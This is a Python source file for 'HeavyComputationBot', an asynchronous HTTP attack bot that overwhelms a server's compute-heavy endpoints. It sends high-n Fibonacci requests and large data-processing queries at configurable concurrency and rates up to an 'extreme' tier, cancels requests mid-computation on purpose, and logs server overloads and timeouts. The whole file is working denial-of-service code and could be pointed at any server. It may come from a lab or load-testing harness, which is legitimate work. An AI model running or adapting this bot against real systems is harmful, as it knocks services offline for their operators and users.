import asyncio
import httpx
import logging
import random
import time
import json
from datetime import datetime
from typing import List, Dict, Optional

class HeavyComputationBot:
    """Bot specifically designed to attack heavy computational endpoints like Fibonacci"""
    
    def __init__(self, 
                 bot_id: str,
                 target_servers: List[str],
                 intensity: str = "medium",
                 computation_complexity: str = "high"):
        
        self.bot_id = bot_id
        self.target_servers = target_servers
        self.intensity = intensity
        self.computation_complexity = computation_complexity
        self.running = False
        
        # Computation complexity configurations
        self.complexity_configs = {
            "low": {"fibonacci_n_range": (20, 25), "concurrent_requests": 3},
            "medium": {"fibonacci_n_range": (25, 30), "concurrent_requests": 5},
            "high": {"fibonacci_n_range": (30, 35), "concurrent_requests": 8},
            "extreme": {"fibonacci_n_range": (35, 40), "concurrent_requests": 12}
        }
        
        # Attack intensity configurations
        self.intensity_configs = {
            "low": {
                "request_rate_per_second": 2,
                "connection_timeout": 30.0,
                "request_timeout": 60.0,
                "abandonment_rate": 0.3
            },
            "medium": {
                "request_rate_per_second": 5,
                "connection_timeout": 20.0,
                "request_timeout": 30.0,
                "abandonment_rate": 0.5
            },
            "high": {
                "request_rate_per_second": 10,
                "connection_timeout": 10.0,
                "request_timeout": 15.0,
                "abandonment_rate": 0.7
            },
            "extreme": {
                "request_rate_per_second": 20,
                "connection_timeout": 5.0,
                "request_timeout": 10.0,
                "abandonment_rate": 0.8
            }
        }
        
        # Heavy computation endpoints
        self.heavy_endpoints = [
            "/heavy-task",
            "/api/data?compute=heavy",
            "/api/data?size=large&compute=true"
        ]
        
        # Attack metrics
        self.total_computation_requests = 0
        self.total_abandoned_computations = 0
        self.total_completed_computations = 0
        self.total_server_overloads = 0
        self.computation_times = []
        self.attack_start_time: Optional[float] = None
        
        self.setup_logging()
    
    def setup_logging(self):
        self.logger = logging.getLogger(f'heavy_computation_bot_{self.bot_id}')
        handler = logging.FileHandler(f'logs/attack_logs/heavy_computation_{self.bot_id}.log')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    async def execute_fibonacci_overload_attack(self, duration: float):
        """Execute attack focused on overwhelming server with fibonacci calculations"""
        complexity_config = self.complexity_configs[self.computation_complexity]
        intensity_config = self.intensity_configs[self.intensity]
        
        end_time = time.time() + duration
        
        self.logger.info(f"Starting fibonacci overload attack for {duration}s")
        self.logger.info(f"Fibonacci range: n={complexity_config['fibonacci_n_range']}, concurrent: {complexity_config['concurrent_requests']}")
        
        active_tasks = set()
        request_counter = 0
        
        while time.time() < end_time and self.running:
            # Maintain concurrent computation requests
            while len(active_tasks) < complexity_config['concurrent_requests']:
                if not self.running:
                    break
                
                # Generate fibonacci computation request
                n_value = random.randint(*complexity_config['fibonacci_n_range'])
                task = asyncio.create_task(
                    self._execute_fibonacci_request(n_value, request_counter)
                )
                active_tasks.add(task)
                request_counter += 1
            
            # Remove completed tasks
            done_tasks = {task for task in active_tasks if task.done()}
            for task in done_tasks:
                try:
                    await task
                except:
                    pass
            active_tasks -= done_tasks
            
            # Control request rate
            await asyncio.sleep(1.0 / intensity_config['request_rate_per_second'])
        
        # Cancel remaining tasks
        for task in active_tasks:
            task.cancel()
        
        await asyncio.gather(*active_tasks, return_exceptions=True)
    
    async def execute_mixed_computation_attack(self, duration: float):
        """Execute mixed attack targeting various heavy computation endpoints"""
        complexity_config = self.complexity_configs[self.computation_complexity]
        intensity_config = self.intensity_configs[self.intensity]
        
        end_time = time.time() + duration
        
        self.logger.info(f"Starting mixed computation attack for {duration}s")
        
        while time.time() < end_time and self.running:
            # Create burst of mixed heavy requests
            tasks = []
            
            for i in range(complexity_config['concurrent_requests']):
                if not self.running:
                    break
                
                # Randomly select heavy endpoint
                endpoint_type = random.choice(['fibonacci', 'heavy_data', 'mixed'])
                
                if endpoint_type == 'fibonacci':
                    n_value = random.randint(*complexity_config['fibonacci_n_range'])
                    task = asyncio.create_task(
                        self._execute_fibonacci_request(n_value, i)
                    )
                elif endpoint_type == 'heavy_data':
                    task = asyncio.create_task(
                        self._execute_heavy_data_request(i)
                    )
                else:
                    task = asyncio.create_task(
                        self._execute_mixed_heavy_request(i)
                    )
                
                tasks.append(task)
            
            # Random abandonment of computation requests
            abandonment_delay = random.uniform(0.5, 3.0)
            await asyncio.sleep(abandonment_delay)
            
            # Abandon some requests based on abandonment rate
            abandon_count = int(len(tasks) * intensity_config['abandonment_rate'])
            for i in range(abandon_count):
                if i < len(tasks) and not tasks[i].done():
                    tasks[i].cancel()
                    self.total_abandoned_computations += 1
                    
                    self.logger.info(json.dumps({
                        "event": "computation_abandoned",
                        "bot_id": self.bot_id,
                        "task_id": i,
                        "abandonment_delay": abandonment_delay,
                        "timestamp": datetime.now().isoformat()
                    }))
            
            # Wait for completion
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Brief pause between bursts
            await asyncio.sleep(random.uniform(1.0, 3.0))
    
    async def _execute_fibonacci_request(self, n_value: int, request_id: int):
        """Execute a single fibonacci computation request"""
        server = random.choice(self.target_servers)
        url = f"{server}/heavy-task?n={n_value}"
        
        intensity_config = self.intensity_configs[self.intensity]
        
        try:
            async with httpx.AsyncClient(
                http2=True,
                timeout=httpx.Timeout(
                    connect=intensity_config["connection_timeout"],
                    read=intensity_config["request_timeout"],
                    write=intensity_config["request_timeout"],
                    pool=intensity_config["request_timeout"]
                )
            ) as client:
                
                headers = {
                    "User-Agent": f"HeavyComputationBot/{self.bot_id}",
                    "X-Attack-Type": "fibonacci_overload",
                    "X-Request-ID": f"{self.bot_id}_fib_{request_id}_{int(time.time() * 1000)}",
                    "X-Fibonacci-N": str(n_value)
                }
                
                start_time = time.time()
                self.total_computation_requests += 1
                
                response = await client.get(url, headers=headers)
                
                computation_time = time.time() - start_time
                self.computation_times.append(computation_time)
                
                if response.status_code == 200:
                    self.total_completed_computations += 1
                    
                    self.logger.info(json.dumps({
                        "event": "fibonacci_completed",
                        "bot_id": self.bot_id,
                        "request_id": request_id,
                        "n_value": n_value,
                        "computation_time": computation_time,
                        "status_code": response.status_code,
                        "timestamp": datetime.now().isoformat()
                    }))
                elif response.status_code >= 500:
                    self.total_server_overloads += 1
                    
                    self.logger.info(json.dumps({
                        "event": "server_overload_detected",
                        "bot_id": self.bot_id,
                        "request_id": request_id,
                        "n_value": n_value,
                        "status_code": response.status_code,
                        "computation_time": computation_time,
                        "timestamp": datetime.now().isoformat()
                    }))
                
        except asyncio.CancelledError:
            self.logger.debug(f"Fibonacci computation cancelled: n={n_value}")
            raise
        except asyncio.TimeoutError:
            self.total_server_overloads += 1
            self.logger.info(json.dumps({
                "event": "computation_timeout",
                "bot_id": self.bot_id,
                "request_id": request_id,
                "n_value": n_value,
                "timeout": intensity_config["request_timeout"],
                "timestamp": datetime.now().isoformat()
            }))
        except Exception as e:
            self.logger.error(f"Fibonacci request failed: n={n_value}, error: {e}")
    
    async def _execute_heavy_data_request(self, request_id: int):
        """Execute heavy data processing request"""
        server = random.choice(self.target_servers)
        
        # Various heavy data endpoints
        endpoints = [
            "/api/data?size=xlarge&compute=true",
            "/api/data?operations=sort,filter,aggregate",
            "/api/data?simulate_processing=true"
        ]
        
        endpoint = random.choice(endpoints)
        url = f"{server}{endpoint}"
        
        intensity_config = self.intensity_configs[self.intensity]
        
        try:
            async with httpx.AsyncClient(
                http2=True,
                timeout=httpx.Timeout(
                    connect=intensity_config["connection_timeout"],
                    read=intensity_config["request_timeout"],
                    write=intensity_config["request_timeout"],
                    pool=intensity_config["request_timeout"]
                )
            ) as client:
                
                headers = {
                    "User-Agent": f"HeavyComputationBot/{self.bot_id}",
                    "X-Attack-Type": "heavy_data_processing",
                    "X-Request-ID": f"{self.bot_id}_data_{request_id}_{int(time.time() * 1000)}"
                }
                
                start_time = time.time()
                self.total_computation_requests += 1
                
                response = await client.get(url, headers=headers)
                
                computation_time = time.time() - start_time
                self.computation_times.append(computation_time)
                
                if response.status_code == 200:
                    self.total_completed_computations += 1
                elif response.status_code >= 500:
                    self.total_server_overloads += 1
                
        except asyncio.CancelledError:
            raise
        except Exception as e:
            self.logger.error(f"Heavy data request failed: {e}")
    
    async def _execute_mixed_heavy_request(self, request_id: int):
        """Execute mixed heavy computation request"""
        server = random.choice(self.target_servers)
        
        # Mix fibonacci with other endpoints
        if random.random() < 0.7:  # 70% fibonacci
            n_value = random.randint(*self.complexity_configs[self.computation_complexity]['fibonacci_n_range'])
            await self._execute_fibonacci_request(n_value, request_id)
        else:  # 30% other heavy operations
            await self._execute_heavy_data_request(request_id)
    
    async def run(self, duration: float = 300):
        """Run the heavy computation attack"""
        self.running = True
        self.attack_start_time = time.time()
        
        self.logger.info(json.dumps({
            "event": "heavy_computation_attack_started",
            "bot_id": self.bot_id,
            "intensity": self.intensity,
            "computation_complexity": self.computation_complexity,
            "duration": duration,
            "target_servers": self.target_servers,
            "timestamp": datetime.now().isoformat()
        }))
        
        try:
            # Execute mixed computation attack strategy
            half_duration = duration / 2
            
            # Phase 1: Pure fibonacci overload
            await self.execute_fibonacci_overload_attack(half_duration)
            
            if self.running:
                # Phase 2: Mixed computation attack
                await self.execute_mixed_computation_attack(half_duration)
            
        except asyncio.CancelledError:
            self.logger.info("Heavy computation attack cancelled")
        except Exception as e:
            self.logger.error(f"Heavy computation attack failed: {e}")
        finally:
            self.running = False
            await self._log_attack_summary()
    
    async def _log_attack_summary(self):
        """Log comprehensive attack summary"""
        attack_duration = time.time() - (self.attack_start_time or time.time())
        
        avg_computation_time = sum(self.computation_times) / len(self.computation_times) if self.computation_times else 0
        max_computation_time = max(self.computation_times) if self.computation_times else 0
        
        summary = {
            "event": "heavy_computation_attack_completed",
            "bot_id": self.bot_id,
            "intensity": self.intensity,
            "computation_complexity": self.computation_complexity,
            "attack_duration": attack_duration,
            "metrics": {
                "total_computation_requests": self.total_computation_requests,
                "total_completed_computations": self.total_completed_computations,
                "total_abandoned_computations": self.total_abandoned_computations,
                "total_server_overloads": self.total_server_overloads,
                "completion_rate": (self.total_completed_computations / max(1, self.total_computation_requests)) * 100,
                "abandonment_rate": (self.total_abandoned_computations / max(1, self.total_computation_requests)) * 100,
                "server_overload_rate": (self.total_server_overloads / max(1, self.total_computation_requests)) * 100,
                "average_computation_time": avg_computation_time,
                "max_computation_time": max_computation_time,
                "requests_per_second": self.total_computation_requests / max(1, attack_duration)
            },
            "target_servers": self.target_servers,
            "timestamp": datetime.now().isoformat()
        }
        
        self.logger.info(json.dumps(summary))
    
    def stop(self):
        """Stop the attack"""
        self.running = False